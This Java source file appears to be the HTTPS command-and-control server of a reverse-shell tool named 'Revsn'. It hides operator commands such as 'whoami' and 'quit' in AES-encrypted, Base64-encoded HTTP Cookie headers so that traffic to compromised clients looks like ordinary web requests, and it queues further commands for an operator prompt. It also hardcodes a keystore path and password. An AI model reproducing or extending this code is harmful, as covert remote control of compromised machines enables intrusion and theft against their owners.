package com.revsni.server.https;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Paths;

import com.sun.net.httpserver.HttpsServer;

import org.apache.commons.codec.binary.Base64;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.KeyStore;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import javax.net.ssl.KeyManagerFactory;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.net.ssl.SSLContext;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;



public class HTTPSServer {

    public volatile HttpsServer httpsServer;
    public volatile SecretKey _key;
    public volatile IvParameterSpec _iv;

    private volatile String answerCommands;
    private SecretKey key;
    private IvParameterSpec iv;

    private Cipher cipherDec;
    private Cipher cipherEnc;

    private volatile boolean est = false;
    
    Logger logger = LogManager.getLogger(getClass());

    public HTTPSServer(SecretKey key, IvParameterSpec iv) {
        _key = key;
        _iv = iv;
        this.key = new SecretKeySpec(key.getEncoded(), key.getAlgorithm());
        this.iv = new IvParameterSpec(iv.getIV());

        //AES init
        try {
            cipherDec = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipherDec.init(Cipher.DECRYPT_MODE, this.key, this.iv);

            cipherEnc = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipherEnc.init(Cipher.ENCRYPT_MODE, this.key, this.iv);
        } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchAlgorithmException | NoSuchPaddingException e) {
            e.printStackTrace();
        }
    }
    
    public void fireUp(InetSocketAddress address) {
    
        logger.info("Start single-threaded server at " + address);
    
        try (ServerSocket serverSocket = getServerSocket(address)) {
    
            Charset encoding = StandardCharsets.UTF_8;
    
            // This infinite loop is not CPU-intensive since method "accept" blocks
            // until a client has made a connection to the socket
            while (true) {
                try (Socket socket = serverSocket.accept();
                     // Use the socket to read the client's request
                     BufferedReader reader = new BufferedReader(new InputStreamReader(
                             socket.getInputStream(), encoding.name()));
                     // Writing to the output stream and then closing it sends
                     // data to the client
                     BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(
                             socket.getOutputStream(), encoding.name()))
                ) {
                    List<String> headers = getHeaderLines(reader);
                    String cookie = headers.get(1);
                    String command = "Hi";
                    //String command = handle(cookie);
                    if(command.length() == 0 || command == null) {
                        writer.write(getResponse(encoding, command));
                        writer.flush();
                        answerCommands = "";
                    }
    
                    writer.write(getResponse(encoding, command));
                    writer.flush();
                    answerCommands = "";
    
                } catch (IOException e) {
                    System.err.println("Exception while handling connection");
                    e.printStackTrace();
                }
            }
        } catch (Exception e) {
            System.err.println("Could not create socket at " + address);
            e.printStackTrace();
        }
    }

    public String handle(String msg) throws IOException {
        String cookie = "";

        if(msg != null) {
            cookie = msg;

            if(cookie.length() > 1) {

                try {
                    msg = new String(cipherDec.doFinal(Base64.decodeBase64(cookie)));
                } catch (IllegalBlockSizeException | BadPaddingException e) {
                    e.printStackTrace();
                }
                if(msg.equals("est")) {
                    try {
                        est = true;
                        cookie = Base64.encodeBase64String(cipherEnc.doFinal("whoami".getBytes()));

                    } catch (IllegalBlockSizeException | BadPaddingException e) {
                        logger.info("Failed to send init whoami command (HTTP-Rev)");
                    }
                } else if(msg.equals("kill")) {
                    try {
                        cookie = Base64.encodeBase64String(cipherEnc.doFinal("quit".getBytes()));
                    } catch (IllegalBlockSizeException | BadPaddingException e) {
                        logger.info("Failed to send Quit command (HTTP-Rev)");
                    }
                } else if(msg.equals("give") && answerCommands.length() > 0) {
                    cookie =  answerCommands;
                } else if(msg.equals("give") && answerCommands.length() == 0) {

                } else {
                    logger.info(msg);
                    System.out.print("Revsn [HTTPS] » ");
                    return null;
                }
                return cookie;
            } 
            return cookie;

        }
        return cookie;
        
        
    }
    
    private ServerSocket getServerSocket(InetSocketAddress address)
            throws Exception {
    
        // Backlog is the maximum number of pending connections on the socket,
        // 0 means that an implementation-specific default is used
        int backlog = 0;
    
        Path keyStorePath = Paths.get("/home/shorida/Projekte/Revsn/revsn/src/main/java/com/revsni/server/https/certificates/keystore.jks");
        char[] keyStorePassword = "lol123".toCharArray();
    
        // Bind the socket to the given port and address
        ServerSocket serverSocket = getSslContext(keyStorePath, keyStorePassword)
                .getServerSocketFactory()
                .createServerSocket(address.getPort(), backlog, address.getAddress());
    
        // We don't need the password anymore → Overwrite it
        Arrays.fill(keyStorePassword, '0');
    
        return serverSocket;
    }
    
    private  SSLContext getSslContext(Path keyStorePath, char[] keyStorePass)
            throws Exception {
    
        KeyStore keyStore = KeyStore.getInstance("JKS");
        keyStore.load(new FileInputStream(keyStorePath.toFile()), keyStorePass);
    
        KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance("SunX509");
        keyManagerFactory.init(keyStore, keyStorePass);
    
        SSLContext sslContext = SSLContext.getInstance("TLS");
        // Null means using default implementations for TrustManager and SecureRandom
        sslContext.init(keyManagerFactory.getKeyManagers(), null, null);
        return sslContext;
    }
    
    private String getResponse(Charset encoding, String command) {
        String body = "The server says hi 👋\r\n";
        int contentLength = body.getBytes(encoding).length;
    
        return "HTTP/1.1 200 OK\r\n" +
                String.format("Content-Length: %d\r\n", contentLength) +
                String.format("Cookie: %s\r\n", command) +
                String.format("Content-Type: text/plain; charset=%s\r\n",
                        encoding.displayName()) +
                // An empty line marks the end of the response's header
                "\r\n" +
                body;
    }
    
    private List<String> getHeaderLines(BufferedReader reader)
            throws IOException {
        List<String> lines = new ArrayList<String>();
        String line = reader.readLine();
        // An empty line marks the end of the request's header
        while (!line.isEmpty()) {
            lines.add(line);
            line = reader.readLine();
        }
        return lines;
    }

    public void sendCommand(String command) {
        String respo = command;
        try {
            answerCommands = new String(Base64.encodeBase64String(cipherEnc.doFinal(respo.getBytes())));
            logger.info("Waiting for Response..");
            respo = "";
        } catch (IllegalBlockSizeException | BadPaddingException e) {
            e.printStackTrace();
        }
    } 

    public boolean getConnInf() {
        return this.est;
    }
}